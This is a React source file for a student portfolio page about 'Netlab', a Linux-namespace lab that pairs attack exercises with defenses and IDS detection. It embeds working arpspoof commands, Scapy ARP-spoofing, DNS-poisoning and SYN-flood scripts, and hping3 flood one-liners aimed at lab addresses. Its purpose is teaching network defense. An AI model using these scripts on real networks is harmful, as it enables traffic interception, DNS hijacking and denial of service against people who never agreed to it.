import { motion } from "motion/react";
import { ArrowLeft, Network, Shield, Zap, Terminal, Activity, ChevronRight, Binary, List, AlertTriangle, Cpu, Globe, Github } from "lucide-react";
import { Link } from "react-router-dom";

const techStrip = [
  "Linux namespaces", "veth pairs", "Linux bridge", "Scapy", "hping3", "arpspoof", "nftables", "Suricata", "sentinel", "Bash", "Python"
];

const stats = [
  { label: "Namespaces", value: "4" },
  { label: "Attack exercises", value: "4" },
  { label: "VMs required", value: "0" },
  { label: "Setup command", value: "./lab/setup.sh" },
];

const exercises = [
  {
    id: "01",
    title: "ARP Spoofing",
    oneLiner: "Poisoning the ARP cache to redirect traffic.",
    exploit: "ARP maps IP addresses to MAC addresses on a LAN. It has no authentication — any host can send a fake ARP reply claiming any IP. The attacker sends gratuitous ARP replies to ns-srv telling it the gateway is at the attacker's MAC.",
    attackCode: `# from ns-atk
ip netns exec ns-atk arpspoof -i veth-atk -t 10.0.0.10 10.0.0.1`,
    attackScapy: `# scapy version
pkt = ARP(op=2, pdst="10.0.0.10", hwdst="target-mac", psrc="10.0.0.1")
send(pkt, loop=1, inter=2)`,
    defense: [
      "Static ARP entry on ns-srv: ip neigh add 10.0.0.1 lladdr <mac> dev veth-srv nud permanent",
      "sentinel arp_spoof.py: alerts when MAC changes for a known IP",
      "arptables rules blocking unsolicited ARP replies"
    ],
    evidence: [
      "tcpdump on ns-srv showing ARP cache change",
      "ip neigh show before/after attack",
      "sentinel ALERT: ARP_SPOOF from 10.0.0.2"
    ]
  },
  {
    id: "02",
    title: "Man-in-the-Middle",
    oneLiner: "ARP spoof both directions + IP forwarding = invisible interception.",
    exploit: "MITM extends ARP spoofing by poisoning both sides simultaneously. With IP forwarding enabled on ns-atk, traffic flows normally through the attacker, who can read every packet in plaintext.",
    attackCode: `# enable forwarding — stay invisible
ip netns exec ns-atk sysctl -w net.ipv4.ip_forward=1

# poison both directions
ip netns exec ns-atk arpspoof -i veth-atk -t 10.0.0.10 10.0.0.1 &
ip netns exec ns-atk arpspoof -i veth-atk -t 10.0.0.1 10.0.0.10 &`,
    defense: [
      "nftables anti-spoof rules: drop packets with source IP not matching expected MAC",
      "HTTPS: payload encrypted, MITM reads nothing useful",
      "sentinel: two ARP spoof alerts (one per direction) = MITM signature"
    ],
    evidence: [
      "HTTP GET requests from ns-srv visible in attacker's tcpdump",
      "Wireshark PCAP showing attacker as relay point",
      "nftables -nvL showing dropped spoofed packets after defense applied"
    ]
  },
  {
    id: "03",
    title: "DNS Poisoning",
    oneLiner: "Racing the real DNS server to inject a fake record.",
    exploit: "DNS queries accept the first matching UDP reply. The attacker sniffs the query and crafts a fake response with the correct transaction ID, pointing target.lab to the attacker's IP before the real server responds.",
    attackCode: `def poison(pkt):
    if DNS in pkt and pkt[DNS].qr == 0:
        fake = (
            IP(dst=pkt[IP].src, src=pkt[IP].dst) /
            UDP(dport=pkt[UDP].sport, sport=53) /
            DNS(id=pkt[DNS].id, qr=1, aa=1,
                qd=pkt[DNS].qd,
                an=DNSRR(rrname=pkt[DNSQR].qname,
                         rdata="10.0.0.2"))
        )
        send(fake)

sniff(filter="udp port 53", prn=poison, iface="veth-atk")`,
    defense: [
      "DNSSEC: signed responses — fake replies lack valid signatures",
      "DNS over HTTPS: queries encrypted, attacker can't read the transaction ID",
      "nftables: block DNS responses not originating from 10.0.0.53"
    ],
    evidence: [
      "Wireshark showing fake A record with correct transaction ID",
      "curl from ns-srv connecting to attacker IP instead of real server",
      "dig @10.0.0.53 target.lab showing poisoned cache"
    ]
  },
  {
    id: "04",
    title: "SYN Flood",
    oneLiner: "Exhausting the TCP connection table with half-open connections.",
    exploit: "The attacker sends thousands of SYN packets per second. Each SYN allocates a TCB on the server. The connection table fills with half-open connections, and legitimate traffic is rejected.",
    attackCode: `# from ns-atk — raw SYN flood
ip netns exec ns-atk hping3 -S --flood -p 80 10.0.0.10`,
    attackScapy: `# scapy version for control
send(IP(dst="10.0.0.10") / TCP(dport=80, flags="S"), loop=1, inter=0)`,
    defense: [
      "SYN cookies: kernel encodes state in the ISN — no TCB allocated until ACK arrives",
      "nftables rate limit: tcp flags syn limit rate 25/second burst 50 accept",
      "sentinel syn_flood.py: CRITICAL alert at 100 SYN/s threshold"
    ],
    evidence: [
      "ss -s before: SYN-RECV 0. After attack: SYN-RECV saturated",
      "tcpdump on ns-srv: wall of SYN packets from 10.0.0.2",
      "sentinel Discord alert: CRITICAL SYN_FLOOD 11,214/s"
    ]
  }
];

export default function NetlabProject() {
  return (
    <div className="bg-[#0f1115] text-[#dfe2ef] min-h-screen selection:bg-[#ff9800]/30 selection:text-[#ffb74d]">
      {/* Navigation */}
      <nav className="fixed top-0 left-0 right-0 z-50 border-b border-[#2c303a] bg-[#0f1115]/80 backdrop-blur-md px-6 py-4 flex justify-between items-center font-mono text-[10px] tracking-widest uppercase">
        <span className="text-[#ff9800] font-bold">NETLAB</span>
        <div className="flex items-center gap-8">
          <a href="https://github.com/SaikiranReddyG/netlab" target="_blank" rel="noopener noreferrer" className="flex items-center gap-2 hover:text-[#ff9800] transition-colors">
            <Github size={14} /> Repository
          </a>
          <Link to="/projects" className="flex items-center gap-2 hover:text-[#ff9800] transition-colors">
            <ArrowLeft size={14} /> Back to portfolio
          </Link>
        </div>
      </nav>

      <main className="pt-32 pb-24">
        {/* HERO */}
        <section className="max-w-7xl mx-auto px-6 md:px-16 mb-32">
          <motion.div
            initial={{ opacity: 0, y: 20 }}
            animate={{ opacity: 1, y: 0 }}
            transition={{ duration: 0.6 }}
          >
            <span className="font-mono text-[10px] text-[#ff9800] tracking-[0.4em] uppercase mb-6 block">NETLAB</span>
            <h1 className="font-display text-4xl md:text-7xl font-bold leading-[1.1] mb-8 tracking-tighter">
              Attack lab. <br/>Built inside the kernel.<br/>
              <span className="text-[#ff9800]">Four namespaces. Zero VMs.</span>
            </h1>
            <p className="font-sans text-xl text-[#bacbbc] max-w-3xl mb-12 leading-relaxed">
              A fully isolated network environment using Linux network namespaces. Four namespaces connected by veth pairs through a bridge — attacker, defender, target server, and DNS server. Real attacks, real tools, zero virtual machine overhead.
            </p>

            <div className="flex flex-wrap gap-2 mb-16">
              {techStrip.map((tech) => (
                <span key={tech} className="border border-[#2c303a] bg-[#1c212a] px-3 py-1 font-mono text-[10px] uppercase text-[#ff9800]">
                  {tech}
                </span>
              ))}
            </div>

            <div className="grid grid-cols-1 sm:grid-cols-4 gap-8 py-8 border-y border-[#2c303a]">
              {stats.map((stat) => (
                <div key={stat.label}>
                  <span className="font-mono text-[10px] uppercase text-[#bacbbc]/60 tracking-widest block mb-1">{stat.label}</span>
                  <span className="font-mono text-lg font-bold text-[#ff9800]">{stat.value}</span>
                </div>
              ))}
            </div>

            <div className="mt-8 italic font-sans text-xs text-[#bacbbc]/40">
              *No VirtualBox. No cloud instances. No emulator overhead. The entire lab lives inside one kernel.*
            </div>
          </motion.div>
        </section>

        {/* THE LAB / TOPOLOGY */}
        <section className="py-32 border-y border-[#2c303a] bg-[#14171d]">
          <div className="max-w-7xl mx-auto px-6 md:px-16">
            <div className="grid grid-cols-1 lg:grid-cols-2 gap-16 mb-24">
              <div>
                <span className="font-mono text-[10px] text-[#ff9800] tracking-[0.2em] uppercase mb-4 block">THE TOPOLOGY</span>
                <h2 className="font-display text-3xl font-bold mb-8">Four isolated network stacks. One bridge. No hardware.</h2>
                <p className="font-sans text-lg text-[#bacbbc] leading-relaxed mb-8">
                  Each namespace has its own routing table, interfaces, and iptables rules — completely separate from each other and the host. Traffic flows through a virtual switch bridge, behaving exactly like a physical LAN segment.
                </p>
                <div className="bg-[#1c212a] border border-[#2c303a] p-6">
                  <h4 className="font-mono text-[#ff9800] text-xs font-bold uppercase mb-2">Why namespaces instead of VMs?</h4>
                  <p className="text-xs text-[#bacbbc] leading-relaxed">
                    A VM means a full OS image and hypervisor overhead. A namespace is a kernel primitive — it takes milliseconds to create and uses zero additional memory for the OS.
                  </p>
                </div>
              </div>
              <div className="flex flex-col justify-center">
                 {/* ASCII / Visual Topology */}
                 <div className="bg-[#0a0c10] border border-[#2c303a] p-8 font-mono text-[10px] text-[#ff9800]">
                    <div className="flex justify-center mb-8">
                       <div className="border border-[#ff9800] bg-[#1c212a] px-4 py-2 text-center">
                          br-lab (10.0.0.1)<br/>
                          <span className="opacity-40">[LINUX BRIDGE]</span>
                       </div>
                    </div>
                    <div className="h-8 flex justify-center items-center gap-16">
                       <div className="h-full w-px bg-[#2c303a]"></div>
                       <div className="h-full w-px bg-[#2c303a]"></div>
                       <div className="h-full w-px bg-[#2c303a]"></div>
                       <div className="h-full w-px bg-[#2c303a]"></div>
                    </div>
                    <div className="grid grid-cols-4 gap-4 text-center text-[#dfe2ef]">
                       <div className="p-2 border border-[#2c303a] bg-[#14171d]">
                          ns-atk<br/><span className="text-[#ff9800] opacity-60">10.0.0.2</span><br/><span className="text-[8px] opacity-40">ATTACKER</span>
                       </div>
                       <div className="p-2 border border-[#2c303a] bg-[#14171d]">
                          ns-def<br/><span className="text-[#ff9800] opacity-60">10.0.0.3</span><br/><span className="text-[8px] opacity-40">DEFENDER</span>
                       </div>
                       <div className="p-2 border border-[#2c303a] bg-[#14171d]">
                          ns-srv<br/><span className="text-[#ff9800] opacity-60">10.0.0.10</span><br/><span className="text-[8px] opacity-40">TARGET</span>
                       </div>
                       <div className="p-2 border border-[#2c303a] bg-[#14171d]">
                          ns-dns<br/><span className="text-[#ff9800] opacity-60">10.0.0.53</span><br/><span className="text-[8px] opacity-40">DNS</span>
                       </div>
                    </div>
                 </div>
              </div>
            </div>

            {/* Setup Code */}
            <div className="bg-[#0f1115] border border-[#2c303a] p-6 font-mono text-[11px] relative overflow-hidden group">
               <div className="flex justify-between items-center mb-4 pb-2 border-b border-[#2c303a]">
                  <span className="text-[#ff9800] uppercase tracking-widest text-[9px]">setup.sh</span>
                  <Terminal size={14} className="text-[#ff9800]/40" />
               </div>
               <pre className="text-[#dfe2ef] leading-relaxed">
{`# create the lab
ip netns add ns-atk && ip netns add ns-def
ip netns add ns-srv && ip netns add ns-dns

# create bridge
ip link add br-lab type bridge && ip link set br-lab up
ip addr add 10.0.0.1/24 dev br-lab

# create veth pair, move one end into namespace
ip link add veth-atk type veth peer name veth-atk-br
ip link set veth-atk netns ns-atk
ip netns exec ns-atk ip addr add 10.0.0.2/24 dev veth-atk
ip netns exec ns-atk ip link set veth-atk up
ip link set veth-atk-br master br-lab && ip link set veth-atk-br up`}
               </pre>
            </div>
          </div>
        </section>

        {/* THE EXERCISES */}
        <section className="py-32 max-w-7xl mx-auto px-6 md:px-16">
          <div className="mb-24">
            <span className="font-mono text-[10px] text-[#ff9800] tracking-[0.2em] uppercase mb-4 block">THE EXERCISES</span>
            <h2 className="font-display text-4xl font-bold mb-4">Attacks and Defenses in Parallel.</h2>
            <p className="font-sans text-[#bacbbc] max-w-2xl">Four exercises building from local network deception to full protocol exploitation and volume-based exhaustion.</p>
          </div>

          <div className="space-y-48">
            {exercises.map((ex, idx) => (
              <motion.div 
                key={ex.id}
                initial={{ opacity: 0, y: 40 }}
                whileInView={{ opacity: 1, y: 0 }}
                viewport={{ once: true }}
                className="relative"
              >
                {/* Visual Thread */}
                {idx < exercises.length - 1 && (
                  <div className="absolute left-1/2 -bottom-24 w-px h-24 bg-gradient-to-b from-[#ff9800]/40 to-transparent hidden lg:block"></div>
                )}
                
                <div className="grid grid-cols-1 lg:grid-cols-12 gap-16">
                  {/* Left: Info */}
                  <div className="lg:col-span-1 border-r border-[#2c303a] pr-4">
                    <span className="font-display text-5xl font-bold text-[#ff9800]/10 mb-4 block">{ex.id}</span>
                  </div>
                  <div className="lg:col-span-11 xl:col-span-5">
                    <h3 className="font-display text-3xl font-bold mb-2">{ex.title}</h3>
                    <p className="font-mono text-xs text-[#ff9800] uppercase mb-6">{ex.oneLiner}</p>
                    <div className="space-y-8">
                       <div>
                          <h4 className="font-mono text-[10px] uppercase text-[#ff9800]/60 mb-2">Exploit:</h4>
                          <p className="font-sans text-sm text-[#bacbbc] leading-relaxed">{ex.exploit}</p>
                       </div>
                       
                       <div className="grid grid-cols-2 gap-4">
                          <div>
                             <h4 className="font-mono text-[10px] uppercase text-[#ff9800]/60 mb-2">Defense:</h4>
                             <ul className="space-y-2 text-[11px] text-[#dfe2ef]">
                                {ex.defense.map((d, i) => <li key={i} className="flex gap-2"><div className="w-1.5 h-1.5 bg-green-500/60 mt-1 flex-shrink-0"></div> {d}</li>)}
                             </ul>
                          </div>
                          <div>
                             <h4 className="font-mono text-[10px] uppercase text-[#ff9800]/60 mb-2">Evidence:</h4>
                             <ul className="space-y-2 text-[11px] text-[#dfe2ef]">
                                {ex.evidence.map((ev, i) => <li key={i} className="flex gap-2"><div className="w-1.5 h-1.5 bg-[#ff9800]/60 mt-1 flex-shrink-0"></div> {ev}</li>)}
                             </ul>
                          </div>
                       </div>
                    </div>
                  </div>

                  {/* Right: Code */}
                  <div className="lg:col-span-12 xl:col-span-6 space-y-4">
                    <div className="bg-[#0a0c10] border border-[#2c303a] p-6 font-mono text-[11px]">
                      <div className="flex items-center gap-2 mb-4 text-red-500 font-bold uppercase text-[9px]">
                         <AlertTriangle size={12} /> ATTACK CLI
                      </div>
                      <pre className="text-red-400 opacity-90 overflow-x-auto">{ex.attackCode}</pre>
                    </div>
                    {ex.attackScapy && (
                       <div className="bg-[#0a0c10] border border-[#2c303a] p-6 font-mono text-[11px]">
                        <div className="flex items-center gap-2 mb-4 text-[#dfe2ef] font-bold uppercase text-[9px]">
                           <Binary size={12} /> SCAPY SCRIPT
                        </div>
                        <pre className="text-blue-400 opacity-90 overflow-x-auto">{ex.attackScapy}</pre>
                      </div>
                    )}
                  </div>
                </div>
              </motion.div>
            ))}
          </div>
        </section>

        {/* PROOF AND ECOSYSTEM */}
        <section className="py-32 bg-[#14171d] border-y border-[#2c303a]">
          <div className="max-w-7xl mx-auto px-6 md:px-16">
            <div className="mb-24 text-center">
              <span className="font-mono text-[10px] text-[#ff9800] tracking-[0.2em] uppercase mb-4 block">PROOF + ECOSYSTEM</span>
              <h2 className="font-display text-4xl font-bold mb-4">Detection In Action.</h2>
              <p className="font-sans text-[#bacbbc]">Proof of detection: where Netlab alerts flow downstream to the SOC stack.</p>
            </div>

            <div className="grid grid-cols-1 lg:grid-cols-2 gap-12 mb-32">
               <div className="space-y-4">
                  <div className="border border-[#2c303a] bg-black aspect-video overflow-hidden">
                     <img src="/assets/sentinal.png" alt="Sentinel Alerts" className="w-full h-full object-cover grayscale hover:grayscale-0 transition-all duration-700" />
                  </div>
                  <p className="font-mono text-[10px] text-[#bacbbc]/60 uppercase">Sentinel alert feed — running in ns-def during a live netlab session.</p>
               </div>
               <div className="space-y-4">
                  <div className="border border-[#2c303a] bg-black aspect-video overflow-hidden">
                     <img src="/assets/netlab.png" alt="Netlab Dashboard" className="w-full h-full object-cover grayscale hover:grayscale-0 transition-all duration-700" />
                  </div>
                  <p className="font-mono text-[10px] text-[#bacbbc]/60 uppercase">Netlab SOC dashboard — Historical alert trend from Netlab exercises.</p>
               </div>
            </div>

            {/* Sentinel Integration */}
            <div className="border border-[#2c303a] bg-[#1c212a] p-12">
               <div className="grid grid-cols-1 lg:grid-cols-2 gap-16 items-center">
                  <div>
                    <h3 className="font-display text-2xl font-bold mb-6">The defender's IDS runs inside the lab.</h3>
                    <p className="font-sans text-base text-[#bacbbc] leading-relaxed mb-8">
                       sentinel runs in <code>ns-def</code>, attached to <code>veth-def</code> — the interface bridged into <code>br-lab</code>. It sees all traffic passing through the namespace topology in real time. This isn't detection against synthetic test packets — it's detection against genuine tools.
                    </p>
                    <div className="flex gap-4">
                       <Link to="/projects/sentinel" className="bg-[#ff9800] text-[#0f1115] px-6 py-2 font-mono text-xs font-bold uppercase tracking-widest hover:bg-[#ffb74d] transition-colors">
                          View Sentinel
                       </Link>
                    </div>
                  </div>
                  <div className="bg-[#0a0c10] p-6 font-mono text-[10px]">
                     <div className="flex justify-between mb-4 border-b border-[#2c303a] pb-2 text-[#ff9800]">
                        <span>LIVE SESSION LOG</span>
                        <Activity size={12} />
                     </div>
                     <p className="text-blue-400">$ ip netns exec ns-def python3 sentinel.py</p>
                     <p className="text-[#dfe2ef] opacity-60">[*] Socket bound to veth-def. Sniffing...</p>
                     <p className="text-red-500 font-bold mt-2">[ALERT] CRITICAL SYN_FLOOD from 10.0.0.2 → 10.0.0.10 [11,214/s]</p>
                     <p className="text-red-500 font-bold">[ALERT] HIGH HTTP_FLOOD detected from 10.0.0.2</p>
                  </div>
               </div>
            </div>
          </div>
        </section>

        {/* ROADMAP */}
        <section className="py-24 max-w-7xl mx-auto px-6 md:px-16">
            <h3 className="font-display text-2xl font-bold mb-12">Where this is going.</h3>
            <div className="grid grid-cols-1 md:grid-cols-2 gap-8 mb-24">
               {[
                 "Wireless deauth/WPA handshake capture inside namespaces",
                 "IPv6 Neighbor Discovery spoofing & RA flooding",
                 "Automated exercise runner for sequential attack testing",
                 "Container-based lab deployment via Docker Compose"
               ].map((item, i) => (
                 <div key={i} className="flex gap-4 items-start border-l-2 border-[#ff9800] pl-6 py-2">
                    <span className="font-mono text-xs text-[#ff9800]">0{i+1}</span>
                    <p className="font-sans text-sm text-[#bacbbc]">{item}</p>
                 </div>
               ))}
            </div>
        </section>
      </main>

      <footer className="border-t border-[#2c303a] py-12 px-6 md:px-16 max-w-7xl mx-auto w-full">
        <div className="flex flex-col md:flex-row justify-between items-start md:items-end gap-8">
          <div>
            <h3 className="font-display text-xl font-bold mb-2 text-[#ff9800]">Saikiran Gangula</h3>
            
          </div>
          <div className="flex flex-wrap gap-x-8 gap-y-4 font-mono text-[10px] uppercase tracking-widest text-[#bacbbc]">
             <a href="https://github.com/SaikiranReddyG/netlab" target="_blank" rel="noopener noreferrer" className="hover:text-[#ff9800] transition-colors">NETLAB REPO</a>
             <Link to="/projects/pulse" className="hover:text-[#ff9800] transition-colors">PULSE</Link>
             <Link to="/projects/sentinel" className="hover:text-[#ff9800] transition-colors">SENTINEL</Link>
             <Link to="/projects/netlab" className="hover:text-[#ff9800] transition-colors text-[#ff9800] font-bold underline underline-offset-8 decoration-2">NETLAB</Link>
             <Link to="/projects/sdn-iot-detection" className="hover:text-[#ff9800] transition-colors">SDN IoT</Link>
          </div>
        </div>

        <div className="mt-12 pt-8 border-t border-[#2c303a] flex flex-wrap justify-between items-center gap-4 font-mono text-[9px] uppercase tracking-[0.3em] opacity-40">
          <div className="flex gap-4">
             <span>Paris, France</span>
             <a href="mailto:saikiranreddy19565@gmail.com">saikiranreddy19565@gmail.com</a>
             <span>+33 07 51 14 76 31</span>
          </div>
          <div className="flex items-center gap-2">
             <span className="text-[10px] opacity-40 uppercase tracking-widest">Final year · seeking end-of-study internship</span>
          </div>
        </div>
      </footer>
    </div>
  );
}
